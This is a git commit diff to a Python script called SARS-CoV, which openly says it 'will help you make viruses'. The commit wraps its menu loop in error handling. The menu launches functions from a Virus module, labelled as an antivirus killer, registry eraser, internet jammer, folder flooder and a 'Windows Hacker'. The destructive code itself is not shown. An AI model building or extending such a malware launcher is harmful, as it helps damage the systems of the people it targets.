c2aed48f69e8cfa04cca451845b08461ada8a433
Mayur Manohar Patil <iammayur.515@gmail.com>
2020-12-12 20:32:26 -0800

    Sars-CoV

--- Sars_cov.py
+++ Sars_cov.py
@@ -37,50 +37,54 @@ cprint(
 
 cprint('Welcome to SARS-CoV. This software will help you make viruses.\n', 'cyan', attrs=['bold'])
 
-while True:
-    cprint('A: Antivirus Hacker', 'yellow', attrs=['bold'])
-    cprint('B: Application Bomber', 'yellow', attrs=['bold'])
-    cprint('C: Registry Key Eraser', 'yellow', attrs=['bold'])
-    cprint('D: Internet Jammer', 'yellow', attrs=['bold'])
-    cprint('E: Endless KeyDown', 'yellow', attrs=['bold'])
-    cprint('F: Folder Flooder', 'yellow', attrs=['bold'])
-    cprint('G: CD Popper', 'yellow', attrs=['bold'])
-    cprint('H: Background Process Producer', 'yellow', attrs=['bold'])
-    cprint('I: User Flooder', 'yellow', attrs=['bold'])
-    cprint('J: Windows Hacker (BRUTAL)', 'yellow', attrs=['bold'])
+try:
+    while True:
+        cprint('A: Antivirus Hacker', 'yellow', attrs=['bold'])
+        cprint('B: Application Bomber', 'yellow', attrs=['bold'])
+        cprint('C: Registry Key Eraser', 'yellow', attrs=['bold'])
+        cprint('D: Internet Jammer', 'yellow', attrs=['bold'])
+        cprint('E: Endless KeyDown', 'yellow', attrs=['bold'])
+        cprint('F: Folder Flooder', 'yellow', attrs=['bold'])
+        cprint('G: CD Popper', 'yellow', attrs=['bold'])
+        cprint('H: Background Process Producer', 'yellow', attrs=['bold'])
+        cprint('I: User Flooder', 'yellow', attrs=['bold'])
+        cprint('J: Windows Hacker (BRUTAL)', 'yellow', attrs=['bold'])
 
-    cprint('Enter the alphabets in \'CAPITAL\'s\' only: ', 'cyan', attrs=['bold'])
-    choice = input()
+        cprint('Enter the alphabets in \'CAPITAL\'s\' only: ', 'cyan', attrs=['bold'])
+        choice = input()
 
-    if choice == "A":
-        from Virus import virus_A
-        virus_A()
-    elif choice == "B":
-        from Virus import virus_B
-        virus_B()
-    elif choice == "C":
-        from Virus import virus_C
-        virus_C()
-    elif choice == "D":
-        from Virus import virus_D
-        virus_D()
-    elif choice == "E":
-        from Virus import virus_E
-        virus_E()
-    elif choice == "F":
-        from Virus import virus_F
-        virus_F()
-    elif choice == "G":
-        from Virus import virus_G
-        virus_G()
-    elif choice == "H":
-        from Virus import virus_H
-        virus_H()
-    elif choice == "I":
-        from Virus import virus_I
-        virus_I()
-    elif choice == "J":
-        from Virus import virus_J
-        virus_J()
-    else:
-        cprint('\nPlease enter only \'CAPITAL\' letter.', 'red', attrs=['bold'])
+        if choice == "A":
+            from Virus import virus_A
+            virus_A()
+        elif choice == "B":
+            from Virus import virus_B
+            virus_B()
+        elif choice == "C":
+            from Virus import virus_C
+            virus_C()
+        elif choice == "D":
+            from Virus import virus_D
+            virus_D()
+        elif choice == "E":
+            from Virus import virus_E
+            virus_E()
+        elif choice == "F":
+            from Virus import virus_F
+            virus_F()
+        elif choice == "G":
+            from Virus import virus_G
+            virus_G()
+        elif choice == "H":
+            from Virus import virus_H
+            virus_H()
+        elif choice == "I":
+            from Virus import virus_I
+            virus_I()
+        elif choice == "J":
+            from Virus import virus_J
+            virus_J()
+        else:
+            cprint('\nPlease enter only \'CAPITAL\' letter.', 'red', attrs=['bold'])
+
+except Exception as e:
+    cprint('Entered wrong choice/ Something went wrong?','red',attrs=['bold'])
